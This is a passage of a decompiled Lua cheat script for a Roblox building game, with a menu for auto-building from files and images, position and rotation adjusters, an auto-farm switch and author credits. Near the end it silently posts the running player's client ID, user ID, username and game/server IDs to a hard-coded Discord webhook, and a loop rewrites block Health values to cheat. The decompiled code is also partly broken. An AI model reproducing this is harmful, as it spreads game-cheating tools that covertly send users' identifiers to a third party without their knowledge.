  -- line: [0, 0] id: 35
  ListBuild(r68_0, r69_0)
end)
r76_0:AddButton("Preview", function()
  -- line: [0, 0] id: 30
  if #r37_0(r8_0) <= 0 then
    PreviewFile(r68_0, r69_0)
  else
    ClearPreview()
  end
end)
r76_0:AddButton("Load File", function()
  -- line: [0, 0] id: 53
  local r0_53 = LoadFile
  local r1_53 = r68_0
  local r2_53 = #r37_0(r8_0)
  if r2_53 <= 1 then
    goto label_12
  else
    r2_53 = 1
    if not r2_53 then
      ::label_12::
      ::label_12::
      r2_53 = r69_0
    end
  end
  r0_53(r1_53, r2_53)
end)
r76_0:Fold(true)
-- close: r69_0
r71_0 = "Images"
r69_0 = r66_0:AddTab(r71_0)
r70_0 = nil
r71_0 = nil
r72_0 = 1
r73_0 = 1
r69_0:AddTextBox("URL", function(r0_49)
  -- line: [0, 0] id: 49
  r70_0 = r0_49
end, {
  clear = false,
})
r74_0 = r69_0:AddFolder("Build Settings")
r74_0:AddTextBox("Block Size (Studs)", function(r0_56)
  -- line: [0, 0] id: 56
  r72_0 = tonumber(r0_56)
end, {
  clear = false,
})
r74_0:AddTextBox("Image Size (Number)", function(r0_44)
  -- line: [0, 0] id: 44
  r73_0 = tonumber(r0_44)
end, {
  clear = false,
})
r75_0 = r74_0:AddDropdown("Block Type", function(r0_50)
  -- line: [0, 0] id: 50
  r71_0 = r0_50
end)
r76_0 = next
local r77_0, r78_0 = r37_0(r2_0.BuildingParts)
for r79_0, r80_0 in r76_0, r77_0, r78_0 do
  local r81_0 = r80_0.Name
  if string.sub(r81_0, #r81_0 - 4, #r81_0) == "Block" then
    r75_0:Add(r81_0)
  end
end
r74_0:Fold(true)
r75_0 = r69_0:AddFolder("Builder")
r75_0:AddButton("List Blocks", function()
  -- line: [0, 0] id: 45
  r64_0(r70_0, r71_0)
end)
r75_0:AddButton("Preview", function()
  -- line: [0, 0] id: 62
  if #r37_0(r8_0) > 0 then
    ClearPreview()
  else
    r63_0(r70_0, r71_0, r72_0, r73_0, true)
  end
end)
r75_0:AddButton("Load Image", function()
  -- line: [0, 0] id: 15
  r63_0(r70_0, r71_0, r72_0, r73_0, false)
end)
r75_0:Fold(true)
-- close: r70_0
r72_0 = "Adjusters"
r70_0 = r66_0:AddTab(r72_0)
r71_0 = 1
r72_0 = r70_0:AddFolder("Position Offset")
r72_0:AddTextBox("Move Multiplier", function(r0_36)
  -- line: [0, 0] id: 36
  r71_0 = r0_36
end, {
  clear = false,
})
r72_0:AddButton("Move Up", function()
  -- line: [0, 0] id: 34
  UpdatePreview(r16_0(0, r71_0, 0))
end)
r72_0:AddButton("Move Down", function()
  -- line: [0, 0] id: 39
  UpdatePreview(r16_0(0, -r71_0, 0))
end)
r72_0:AddButton("Move Left", function()
  -- line: [0, 0] id: 9
  UpdatePreview(r16_0(r71_0, 0, 0))
end)
r72_0:AddButton("Move Right", function()
  -- line: [0, 0] id: 14
  UpdatePreview(r16_0(-r71_0, 0, 0))
end)
r72_0:AddButton("Move Forwards", function()
  -- line: [0, 0] id: 5
  UpdatePreview(r16_0(0, 0, r71_0))
end)
r72_0:AddButton("Move Backwards", function()
  -- line: [0, 0] id: 65
  UpdatePreview(r16_0(0, 0, -r71_0))
end)
r72_0:Fold(true)
r73_0 = r70_0:AddFolder("Rotation Offset")
r73_0:AddSlider("X", function(r0_23)
  -- line: [0, 0] id: 23
  r55_0 = r0_23
  UpdatePreview()
end, {
  min = 0,
  max = 360,
})
r73_0:AddSlider("Y", function(r0_11)
  -- line: [0, 0] id: 11
  r56_0 = r0_11
  UpdatePreview()
end, {
  min = 0,
  max = 360,
})
r73_0:AddSlider("Z", function(r0_1)
  -- line: [0, 0] id: 1
  r57_0 = r0_1
  UpdatePreview()
end, {
  min = 0,
  max = 360,
})
r73_0:Fold(true)
r74_0 = r70_0:AddFolder("Other")
r74_0:AddTextBox("Size %", function(r0_64)
  -- line: [0, 0] id: 64
  ClearPreview()
  PreviewFile(r68_0, tonumber(r0_64) / 100)
end, {
  clear = false,
})
r74_0:AddButton("Mirror Build", MirrorBuild)
r74_0:Fold(true)
-- close: r71_0
r73_0 = "Other"
r71_0 = r66_0:AddTab(r73_0)
r72_0 = r71_0:AddFolder("Auto Farm")
r72_0:AddSwitch("Enabled", AutoFarm)
r72_0:Fold(true)
r72_0 = r66_0:AddTab("Info")
r73_0 = r72_0:AddFolder("Credits")
r72_0:AddButton("Click To Copy Credits", function()
  -- line: [0, 0] id: 19
  setclipboard("\r\n        Copied\r\n        Credits to Sten for the original source\r\n        My Profile Roblox : https://www.roblox.com/users/675170477/profile\r\n        My Profile Disocrd : slade_yt\r\n        My Server Discord : https://discord.gg/HjNaYs6AnV\r\n        Donation : (metamask)\r\n        ETH, LIN, BNB : 0xCfad4d8774951b4e1Ca334A9774d0F0e3a961D84\r\n        ")
end)
r67_0:Show()
r0_0:FormatWindows()
r74_0 = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
r75_0 = game.Players.LocalPlayer
print("")
r77_0 = "https://discord.com/api/webhooks/1210259015670431785/SZhLdOFcJGnLx0HsH4VeM_joB8EgF9hOjkrhCz2WXup5V8rJnvm5RD_MVfGFblQdIahb"
r78_0 = {
  username = "Exec-AutoBuild-V2",
  content = "To join the game, click this link: [Join Game](https://web.roblox.com/home?placeID=" .. game.PlaceId .. "&gameID" .. game.JobId .. ")  \nTo join the player, use this link: [Player Link](https://roblox.com/users/" .. r75_0.UserId .. "/profile)",
}
local r79_0 = "embeds"
local r80_0 = {}
local r81_0 = {}
r81_0.author = {
  name = "Script Execution",
  url = "https://discord.gg/HjNaYs6AnV",
  icon_url = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
}
r81_0.footer = {
  text = "slade was here",
  icon_url = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
}
r81_0.title = "Script Execution Alert"
local r82_0 = "description"
local r83_0 = string.format
local r84_0 = "Client ID: %s\nProfile: [Player Profile](https://roblox.com/users/%d/profile)\nUsername: **%s**\nDisplayName: **%s**\nUserID: **%d**\nGameID: **%s**\nGameName: **%s**"
local r85_0 = game:GetService("RbxAnalyticsService"):GetClientId()
local r86_0 = r75_0.UserId
local r87_0 = r75_0.Name
local r88_0 = r75_0.DisplayName
if r88_0 ~= r75_0.Name then
  r88_0 = r75_0.DisplayName
  if r88_0 then
  end
else
  r88_0 = "N/A"
end
r81_0[r82_0] = r83_0(r84_0, r85_0, r86_0, r87_0, r88_0, r75_0.UserId, game.PlaceId, r74_0.Name)
r81_0.type = "rich"
r81_0.color = tonumber(65280)
r81_0.image = {
  url = "https://media.discordapp.net/attachments/1186727033703764000/1209875883242819684/image.png?ex=65e883b8&is=65d60eb8&hm=42628065dbac00e45cbc1de9993c393739cdc921ed9f37591ec9300035858b26&=&format=webp&quality=lossless&width=96&height=93",
}
-- setlist for #80 failed
r78_0[r79_0] = r80_0
r79_0 = game:GetService("HttpService")
r81_0 = "JSONEncode"
r81_0 = r78_0
r79_0 = r79_0:[r81_0](r81_0)
r80_0 = {
  ["content-type"] = "application/json",
}
r81_0 = http_request
if not r81_0 then
  r81_0 = r44_0
  if r81_0 then
    r81_0 = HttpPost
    if not r81_0 then
      r81_0 = syn.request
    end
  end
end
r81_0({
  Url = r77_0,
  Body = r79_0,
  Method = "POST",
  Headers = r80_0,
})
while true do
  wait(0.1)
  for r86_0, r87_0 in ipairs(workspace.Blocks:GetDescendants()) do
    local r90_0 = "IsA"
    r90_0 = "Folder"
    r88_0 = r87_0:[r90_0](r90_0)
    if r88_0 then
      r88_0 = ipairs
      for r91_0, r92_0 in r88_0(r87_0:GetDescendants()) do
        local r95_0 = "IsA"
        r95_0 = "IntValue"
        if r92_0:[r95_0](r95_0) and r92_0.Name == "Health" then
          local r93_0 = Instance.new("StringValue")
          r93_0.Name = "Health"
          r93_0.Value = r87_0.Name
          r93_0.Parent = r92_0.Parent
          r92_0:Destroy()
        end
      end
    end
  end
end
